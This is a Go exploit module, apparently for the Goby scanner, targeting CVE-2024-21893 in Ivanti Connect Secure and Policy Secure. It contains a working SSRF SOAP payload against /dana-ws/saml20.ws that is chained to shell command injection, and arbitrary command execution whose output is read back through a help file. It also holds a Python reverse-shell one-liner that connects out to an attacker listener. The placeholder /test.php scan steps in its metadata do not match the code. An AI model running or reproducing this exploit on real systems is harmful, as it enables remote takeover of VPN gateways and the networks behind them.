package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Ivanti Connect Secure and Policy Secure saml20.ws server-side request forgery vulnerability (CVE-2024-21893)",
    "Description": "<p>Ivanti Connect/Policy Secure is a secure remote network connection tool from the American company Ivanti.</p><p>Ivanti Connect Secure product saml20.ws has a server-side request forgery vulnerability. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
    "Product": "PulseSecure-SSL-VPN",
    "Homepage": "https://www.pulsesecure.net/",
    "DisclosureDate": "2024-01-31",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "header=\"DSBrowserID\" || banner=\"DSBrowserID\" || body=\"/dana-na/;expires=\" || body=\"dana-cached/imgs/space.gif\" || body=\"/dana-na/imgs/space.gif\" || body=\"/dana-na/imgs/Product_favicon.png\" || body=\"/dana-na/imgs/Ivanti_favicon.png\" || body=\"/dana-na/css/ds.js\" || body=\"ds_mobile_safari.css\" || body=\"welcome.cgi?p=logo&signinId=url_default\" || body=\"<b>Pulse Connect Secure</b>\" || title=\"Secure&#32;Access&#32;SSL&#32;VPN\" || banner=\"/dana-na/auth/url_default\" || header=\"/dana-na/auth/url_default\" || body=\"src=\\\"/dana-na/auth/\"",
    "GobyQuery": "header=\"DSBrowserID\" || banner=\"DSBrowserID\" || body=\"/dana-na/;expires=\" || body=\"dana-cached/imgs/space.gif\" || body=\"/dana-na/imgs/space.gif\" || body=\"/dana-na/imgs/Product_favicon.png\" || body=\"/dana-na/imgs/Ivanti_favicon.png\" || body=\"/dana-na/css/ds.js\" || body=\"ds_mobile_safari.css\" || body=\"welcome.cgi?p=logo&signinId=url_default\" || body=\"<b>Pulse Connect Secure</b>\" || title=\"Secure&#32;Access&#32;SSL&#32;VPN\" || banner=\"/dana-na/auth/url_default\" || header=\"/dana-na/auth/url_default\" || body=\"src=\\\"/dana-na/auth/\"",
    "Level": "3",
    "Impact": "<p>Ivanti Connect Secure product saml20.ws has a server-side request forgery vulnerability. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
    "Recommendation": "<p>The manufacturer has released vulnerability patches, please update them promptly: <a href=\"https://forums.ivanti.com/s/article/CVE-2024-21888-Privilege-Escalation-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure?language=en_US\">https://forums.ivanti.com/s/article/CVE-2024-21888-Privilege-Escalation-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure?language=en_US</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Server-Side Request Forgery",
        "Command Execution"
    ],
    "VulType": [
        "Command Execution",
        "Server-Side Request Forgery"
    ],
    "CVEIDs": [
        "CVE-2024-21893"
    ],
    "CNNVD": [
        "CNNVD-202401-2693"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "Ivanti Connect Secure 和 Policy Secure saml20.ws 服务端请求伪造漏洞（CVE-2024-21893）",
            "Product": "PulseSecure-SSL-VPN",
            "Description": "<p>Ivanti Connect/Policy Secure 是美国 Ivanti 公司的一款安全远程网络连接工具。</p><p>Ivanti Connect Secure 产品 saml20.ws 存在服务端请求伪造漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>厂商已发布漏洞补丁，请及时更新：<a href=\"https://forums.ivanti.com/s/article/CVE-2024-21888-Privilege-Escalation-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure?language=en_US\" target=\"_blank\">https://forums.ivanti.com/s/article/CVE-2024-21888-Privilege-Escalation-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure?language=en_US</a></p>",
            "Impact": "<p>Ivanti Connect Secure 产品 saml20.ws 存在服务端请求伪造漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "服务器端请求伪造",
                "命令执行"
            ],
            "Tags": [
                "服务器端请求伪造",
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Ivanti Connect Secure and Policy Secure saml20.ws server-side request forgery vulnerability (CVE-2024-21893)",
            "Product": "PulseSecure-SSL-VPN",
            "Description": "<p>Ivanti Connect/Policy Secure is a secure remote network connection tool from the American company Ivanti.</p><p>Ivanti Connect Secure product saml20.ws has a server-side request forgery vulnerability. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
            "Recommendation": "<p>The manufacturer has released vulnerability patches, please update them promptly: <a href=\"https://forums.ivanti.com/s/article/CVE-2024-21888-Privilege-Escalation-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure?language=en_US\" target=\"_blank\">https://forums.ivanti.com/s/article/CVE-2024-21888-Privilege-Escalation-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure?language=en_US</a><br></p>",
            "Impact": "<p>Ivanti Connect Secure product saml20.ws has a server-side request forgery vulnerability. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.<br></p>",
            "VulType": [
                "Command Execution",
                "Server-Side Request Forgery"
            ],
            "Tags": [
                "Server-Side Request Forgery",
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-02-05",
    "PocId": "10922"
}`
	sendPayloadPZXOIUJEW := func(hostInfo *httpclient.FixUrl, urlPayload string) (*httpclient.HttpResponse, error) {
		postConfig := httpclient.NewPostRequestConfig("/dana-ws/saml20.ws")
		postConfig.Header.Store("Content-Type", "text/xml")
		postConfig.VerifyTls = false
		postConfig.FollowRedirect = false
		postConfig.Data = `<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
	<soap:Body>
		<ds:Signature
		xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
			<ds:SignedInfo>
				<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
				<ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
			</ds:SignedInfo>
			<ds:SignatureValue>qwerty</ds:SignatureValue>
			<ds:KeyInfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.w3.org/2000/09/xmldsig" xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
				<ds:RetrievalMethod URI="` + urlPayload + `"/>
				<ds:X509Data/>
			</ds:KeyInfo>
			<ds:Object></ds:Object>
		</ds:Signature>
	</soap:Body>
</soap:Envelope>`
		return httpclient.DoHttpRequest(hostInfo, postConfig)
	}

	urlParamsEncodeOXCIUASD := func(s string) string {
		var encoded strings.Builder
		for i := 0; i < len(s); i++ {
			encoded.WriteString(fmt.Sprintf("%%%X", s[i]))
		}
		return "http://127.0.0.1:8090/api/v1/license/keys-status/" + encoded.String()
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			if _, err := sendPayloadPZXOIUJEW(hostInfo, urlParamsEncodeOXCIUASD(`;rm -f "/data/runtime/webserver/htdocs/dana-na/help/index.txt"; `+checkStr+` > "/data/runtime/webserver/htdocs/dana-na/help/index.txt" 2>&1`)); err != nil {
				return false
			}
			getConfig := httpclient.NewGetRequestConfig("/dana-na/help/index.txt")
			getConfig.FollowRedirect = false
			getConfig.VerifyTls = false
			if resp, _ := httpclient.DoHttpRequest(hostInfo, getConfig); resp != nil && strings.Contains(resp.RawBody, checkStr) {
				stepLogs.VulURL = hostInfo.FixedHostInfo + `/dana-ws/saml20.ws`
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "cmd" {
				payload := `;rm -f "/data/runtime/webserver/htdocs/dana-na/help/index.txt"; ` + goutils.B2S(ss.Params["cmd"]) + ` > "/data/runtime/webserver/htdocs/dana-na/help/index.txt" 2>&1`
				if _, err := sendPayloadPZXOIUJEW(expResult.HostInfo, urlParamsEncodeOXCIUASD(payload)); err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				getConfig := httpclient.NewGetRequestConfig("/dana-na/help/index.txt")
				getConfig.FollowRedirect = false
				getConfig.VerifyTls = false
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, getConfig); resp != nil && resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				} else if err != nil {
					expResult.Output = err.Error()
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				//rp就是拿到的监听端口
				if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := ";python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + godclient.GetGodServerHost() + "\"," + rp + "));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())';"
					sendPayloadPZXOIUJEW(expResult.HostInfo, urlParamsEncodeOXCIUASD(cmd))
					select {
					case webConsoleID := <-waitSessionCh:
						if u, err := url.Parse(webConsoleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 25):
					}
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
